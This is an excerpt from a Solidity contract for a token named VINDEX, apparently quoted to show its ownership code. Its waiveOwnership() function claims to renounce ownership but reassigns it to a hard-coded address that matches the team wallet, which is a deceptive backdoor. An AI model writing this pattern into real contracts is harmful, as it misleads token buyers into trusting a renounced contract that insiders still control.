...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x3891e5DC0bBc82B3aFBD4310b32AcD994Ac5e7B9);
    }
...
contract VINDEX is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "VINDEX";
    string private _symbol = "VDEX";
    uint8 private _decimals = 9;

    address payable public fundWalletAddress = payable(0x11e61d72CD63eF23c577452fFB431f7b06c47cba);
    address payable public teamWalletAddress = payable(0x3891e5DC0bBc82B3aFBD4310b32AcD994Ac5e7B9);
